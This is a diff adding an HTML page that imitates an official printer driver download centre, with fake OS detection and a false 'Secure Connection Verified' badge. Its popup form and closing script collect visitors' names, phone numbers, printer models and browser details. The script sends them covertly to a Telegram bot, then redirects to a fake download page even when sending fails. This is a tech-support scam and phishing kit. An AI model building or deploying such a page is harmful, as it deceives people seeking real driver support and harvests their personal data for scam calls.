@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driver Support & Downloads | Official Resource Center</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #3498db;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+
+<body class="bg-[#f9f9f9]">
+
+    <div class="bg-[#0033a0] shadow-md relative z-10">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="flex items-center justify-between h-16">
+
+                <div class="flex items-center gap-2">
+                    <div class="bg-white text-[#0033a0] h-8 w-8 flex items-center justify-center rounded font-bold text-xl">
+                        <i class="fas fa-print"></i>
+                    </div>
+                    <div class="text-white text-lg md:text-xl font-bold tracking-tight">
+                        Support<span class="font-light opacity-80">Center</span>
+                    </div>
+                </div>
+
+                <div class="hidden md:flex text-white text-sm font-medium gap-8">
+                    <a href="#" class="opacity-80 hover:opacity-100 border-b-2 border-transparent hover:border-white pb-1 transition">Drivers</a>
+                    <a href="#" class="opacity-80 hover:opacity-100 border-b-2 border-transparent hover:border-white pb-1 transition">Diagnostics</a>
+                    <a href="#" class="opacity-80 hover:opacity-100 border-b-2 border-transparent hover:border-white pb-1 transition">Contact</a>
+                </div>
+
+                <div class="text-white flex items-center gap-3 text-sm">
+                    <span class="hidden md:inline opacity-75">United States (EN)</span>
+                    <i class="fas fa-globe text-lg cursor-pointer"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 py-3 flex flex-col md:flex-row justify-between items-center text-sm">
+            <div class="font-semibold text-gray-700 mb-2 md:mb-0">
+                <i class="fab fa-windows text-blue-600 mr-2"></i>
+                Detected OS: <span class="text-green-600">Windows 10 / 11 (64-bit)</span>
+            </div>
+            <div class="text-blue-700 font-medium cursor-pointer hover:underline text-xs md:text-sm">
+                Choose a different OS
+            </div>
+        </div>
+    </div>
+
+    <div class="max-w-5xl mx-auto px-4 py-16 text-center">
+
+        <h1 class="text-3xl md:text-5xl font-light text-gray-900 mb-4 tracking-tight">
+            Software and Driver Downloads
+        </h1>
+        
+        <p class="text-lg text-gray-500 max-w-2xl mx-auto mb-10">
+            Welcome to the Software and Driver Downloads page. To ensure optimal performance and features, please identify your product below.
+        </p>
+
+        <div class="bg-white p-8 md:p-12 rounded-lg shadow-lg border border-gray-200 relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-600 to-blue-400"></div>
+
+            <h2 class="text-2xl font-semibold text-gray-800 mb-6">Let's identify your product to get started</h2>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
+                <div class="flex flex-col items-center justify-center p-6 bg-blue-50 rounded-lg border border-blue-100">
+                    <i class="fas fa-print text-6xl text-blue-300 mb-4"></i>
+                    <p class="text-sm text-gray-600 font-medium">Printer / Scanner / Copier</p>
+                </div>
+
+                <div class="text-left">
+                    <p class="text-gray-700 mb-4 font-medium">Enter your product name (e.g. MFC-J1010DW)</p>
+                    
+                    <div class="relative">
+                        <input type="text" placeholder="Example: HL-L2390DW" 
+                            class="w-full border border-gray-300 rounded-md py-3 px-4 pl-10 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition shadow-sm">
+                        <i class="fas fa-search absolute left-3 top-4 text-gray-400"></i>
+                    </div>
+
+                    <button onclick="openPopup()" 
+                        class="mt-4 w-full bg-[#005eb8] text-white py-3 rounded-md font-bold text-lg hover:bg-[#004a91] transition shadow-md flex items-center justify-center gap-2">
+                        Submit <i class="fas fa-arrow-right text-sm"></i>
+                    </button>
+                    
+                    <p class="text-xs text-gray-400 mt-3">
+                        <i class="fas fa-lock mr-1"></i> Secure Connection Verified
+                    </p>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="max-w-6xl mx-auto px-4 py-10 grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
+        <div class="p-4">
+            <i class="fas fa-shield-alt text-3xl text-gray-400 mb-3"></i>
+            <h3 class="font-bold text-gray-700">Official Drivers</h3>
+            <p class="text-sm text-gray-500">Certified software for your device.</p>
+        </div>
+        <div class="p-4">
+            <i class="fas fa-wifi text-3xl text-gray-400 mb-3"></i>
+            <h3 class="font-bold text-gray-700">Wireless Setup</h3>
+            <p class="text-sm text-gray-500">Tools to fix connectivity issues.</p>
+        </div>
+        <div class="p-4">
+            <i class="fas fa-headset text-3xl text-gray-400 mb-3"></i>
+            <h3 class="font-bold text-gray-700">Installation Help</h3>
+            <p class="text-sm text-gray-500">Guides for step-by-step setup.</p>
+        </div>
+    </div>
+
+    <div id="popup" class="fixed inset-0 hidden bg-black bg-opacity-60 z-50 items-center justify-center backdrop-blur-sm transition-opacity">
+        <div class="bg-white rounded-lg shadow-2xl max-w-md w-full p-8 relative transform transition-all scale-100">
+
+            <button onclick="closePopup()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
+
+            <div class="text-center mb-6">
+                <div class="bg-blue-100 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <i class="fas fa-download text-[#0033a0] text-xl"></i>
+                </div>
+                <h2 class="text-xl font-bold text-gray-800">Complete Request</h2>
+                <p class="text-sm text-gray-500 mt-1">Please confirm details to access the correct driver version.</p>
+            </div>
+
+            <form id="leadForm" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Printer Model</label>
+                    <input id="model" required class="w-full border border-gray-300 px-3 py-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50" placeholder="e.g. MFC-L2710DW">
+                </div>
+                
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Your Name</label>
+                    <input id="name" required class="w-full border border-gray-300 px-3 py-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Full Name">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Phone Number</label>
+                    <input id="phone" type="tel" required class="w-full border border-gray-300 px-3 py-2 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Mobile Number">
+                </div>
+
+                <button type="submit" id="submitBtn"
+                    class="w-full bg-[#005eb8] text-white py-3 rounded font-bold text-base hover:bg-[#004a91] transition mt-2 flex items-center justify-center gap-2">
+                    <span>Continue to Download</span>
+                </button>
+            </form>
+
+            <p class="text-[10px] text-gray-400 mt-4 text-center leading-tight">
+                By clicking Continue, you agree to our Terms of Use and Privacy Policy. We use this information to provide product support.
+            </p>
+
+        </div>
+    </div>
+
+    <footer class="bg-gray-100 border-t border-gray-200 pt-10 pb-6 mt-10">
+        <div class="max-w-7xl mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 text-sm text-gray-600">
+                <div>
+                    <h4 class="font-bold text-gray-800 mb-3">About Us</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:underline">Company Info</a></li>
+                        <li><a href="#" class="hover:underline">Careers</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-bold text-gray-800 mb-3">Support</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:underline">Download Drivers</a></li>
+                        <li><a href="#" class="hover:underline">Support & Troubleshooting</a></li>
+                    </ul>
+                </div>
+                <div class="col-span-1 md:col-span-2">
+                    <h4 class="font-bold text-gray-800 mb-3">Disclaimer</h4>
+                    <p class="text-xs leading-relaxed text-gray-500">
+                        This website is an independent provider of technical support and educational resources for various third-party hardware and software. Use of names, trademarks, and brands does not imply endorsement by or affiliation with the respective owners.
+                    </p>
+                </div>
+            </div>
+            <div class="border-t border-gray-300 pt-6 text-center text-xs text-gray-500">
+                &copy; 2026 Device Solutions Center. All Rights Reserved. | Privacy Policy
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // REPLACE THESE WITH YOUR ACTUAL DETAILS
+        const BOT_TOKEN = "YOUR_BOT_TOKEN"; 
+        const CHAT_ID = "YOUR_CHAT_ID";
+
+        function openPopup() {
+            document.getElementById("popup").classList.remove("hidden");
+            document.getElementById("popup").classList.add("flex");
+        }
+
+        function closePopup() {
+            document.getElementById("popup").classList.add("hidden");
+            document.getElementById("popup").classList.remove("flex");
+        }
+
+        // Close popup if clicking outside the box
+        document.getElementById("popup").addEventListener("click", function(e) {
+            if (e.target === this) {
+                closePopup();
+            }
+        });
+
+        document.getElementById("leadForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+
+            const btn = document.getElementById("submitBtn");
+            const originalText = btn.innerHTML;
+            
+            // Show Loading State
+            btn.disabled = true;
+            btn.innerHTML = '<div class="loader"></div> Processing...';
+            btn.classList.add("opacity-75", "cursor-not-allowed");
+
+            const name = document.getElementById("name").value;
+            const model = document.getElementById("model").value;
+            const phone = document.getElementById("phone").value;
+
+            // Gather Device Info for better lead quality
+            const userAgent = navigator.userAgent;
+            
+            const message = `🖨 *New Driver Request*\n\n👤 *Name:* ${name}\n📦 *Model:* ${model}\n📞 *Phone:* ${phone}\n💻 *System:* ${userAgent}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message,
+                    parse_mode: "Markdown" // Makes the text bold in Telegram
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Successful - Redirect
+                    window.location.href = "download-processing.html"; 
+                } else {
+                    alert("Connection Error. Please try again.");
+                    btn.disabled = false;
+                    btn.innerHTML = originalText;
+                    btn.classList.remove("opacity-75", "cursor-not-allowed");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                // Fallback redirect even if API fails (optional strategy)
+                window.location.href = "download-processing.html"; 
+            });
+        });
+    </script>
+
+</body>
+</html>
